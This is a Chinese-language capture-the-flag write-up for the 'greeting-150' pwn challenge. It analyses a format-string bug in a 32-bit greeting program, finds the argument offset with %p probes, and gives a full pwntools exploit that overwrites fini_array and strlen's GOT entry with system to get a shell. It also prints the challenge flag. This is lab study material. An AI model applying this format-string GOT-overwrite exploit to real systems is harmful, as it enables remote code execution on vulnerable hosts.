# greeting-150

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=a065ca98-80ae-417b-a469-c04a6c7f9ec3_2)

真就脚本小子，没了pwntools的自动格式化字符串我连wp都无法完全理解。

运行得知是个打招呼的程序，checksec如下。

-   Arch:     i386-32-little
    <br>RELRO:    No RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x8048000)

反编译main发现很明显的格式化字符串漏洞。

```c
void main(void)
{
  int iVar1;
  int in_GS_OFFSET;
  char local_94 [64];
  undefined local_54 [64];
  int local_14;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Please tell me your name... ");
  iVar1 = getnline(local_54,64);
  if (iVar1 == 0) {
    puts("Don\'t ignore me ;( ");
  }
  else {
    sprintf(local_94,"Nice to meet you, %s :)\n",local_54);
    printf(local_94);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

local_94包含我们可以控制的值，并且直接将其当作格式化字符串的一部分输出。想都不用想，直接%p算偏移,后面肯定有用。

- Hello, I'm nao!
<br>Please tell me your name... AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
<br>Nice to meet you, AAAA,0x80487d0,0xfff9309c,0x3,0x3cef5800,0xf7d7496b,0xf7f5654a,0x6563694e,0x206f7420,0x7465656d,0x756f7920,0x4141202c,0x252c4141,0x70252c70,0x2c70252c,0x252c7025,0x70252c70 :)

出现了不一样的情况。AAAA并没有按照之前那样成对地出现，而是被拆成了两个部分。此处涉及到内存的对齐。简单说就是系统一次取4个字节，但是AAAA的起始地址不是4的整数倍，所以4个4个取的时候就被拆成了两半。想要找到正确的偏移就要多放几个字符用于对齐。

- Hello, I'm nao!
<br>Please tell me your name... aaAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
<br>Nice to meet you, aaAAAA,0x80487d0,0xffd776bc,0x3,0xe8655900,0xf7d3496b,0xf7f1654a,0x6563694e,0x206f7420,0x7465656d,0x756f7920,0x6161202c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c :)

很容易就能找到对齐字符的个数为2。直接记找偏移时要让输入字符成对出现，成对出现的地方就是偏移。那么这里的偏移就是12。程序内部没有现成后门，看来要使用任意写改写某些地址了。

但是改哪？整个程序只会运行一次，改普通的函数也调用不到。新的知识点出现了：程序结束时会调用fini_array里的函数，ghidra中在这里可以看到。

![fini_array](../../images/fini_array.png)

往左划，划到最右边的绿色字体处，能看到一个_elfSectionHeaders。鼠标悬停在后面的指针就能找到fini_array中函数的地址为0x80485a0。既然程序在结束时会调用这个函数，那我们如果能把这个函数改为main函数的地址，不就可以循环进入main了吗？

倒是可以直接用格式化字符串的%n来实现。问题是，main函数的地址为0x080485ed，fini_array中的地址为0x80485a0。先不用说输出那么0x080485ed那么多字节要多久，这俩玩意就最后两个字节不一样，至于把全部都覆盖一遍吗？%hhn一次写两字节，正好符合我们的要求。可以把%n扔了。

如果改写成功，我们就有了无限的漏洞可以利用。但除了用格式化字符串搞事情我们也没别的可干了，有没有什么办法可以getshell？

```c
void getnline(char *param_1,int param_2)
{
  char *pcVar1;
  fgets(param_1,param_2,stdin);
  pcVar1 = strchr(param_1,10);
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  strlen(param_1);
  return;
}
```

main函数内部调用了这个函数。这个函数内部又莫名其妙调用了个strlen。等一下，strlen只需要一个参数，跟system一样，而且参数我们可以随意控制。根据之前的经验，把strlen函数的got表改成system，参数传/bin/sh，不就可以getshell了吗？

strlen的got表地址为0x08049a54。system的plt是0x08048490。两者最后4字节不一样，不过拆成2次，一次2字节，hhn还是能冲。这块我有点不理解。strlen和system前面的0804是一样的，为什么不能直接跟前面改fini_array一样呢？如果能改怎么改呢？看wp和个人实验都发现必须连着0804一起覆盖了。唉我还是不懂格式化字符串，看看以后多做题能不能懂。

覆盖4个也不难，还是别钻牛角尖非要只覆盖两个了。在覆盖之前，我们需要把要覆盖的地址从小到达排列，因为hn家族都是根据前面已输出的字节数来改写地址的。如果从大的开始，无论如何都没法接着写小的了。exp出来了。

```python
from pwn import*
p=remote("61.147.171.105",57271)
main_addr = 0x080485ED
fini_array = 0x08049934
system_plt = 0x08048490
strlen_got = 0x08049A54
fini_num = 0x85ED
sysplt_num1 = 0x0804
sysplt_num2 = 0x8490
p.recvuntil('Please tell me your name... ')
pl = b'a'*2
pl+=p32(strlen_got)
pl += p32(strlen_got+2)
pl += p32(fini_array)
pl += b'%' + b'2020' + b'c%13$hn'
pl += b'%' + b'31884' + b'c%12$hn'
pl += b'%' + b'349' + b'c%14$hn'
p.sendline(pl)
p.recvuntil('Please tell me your name... ')
p.sendline('/bin/sh')
p.interactive()
```

strlen_got+2是因为程序是小端，低位地址反而在高位地址后面。

- ### Flag
  > cyberpeace{5ebb8cd174ba45fd3a912ed8656901ff}
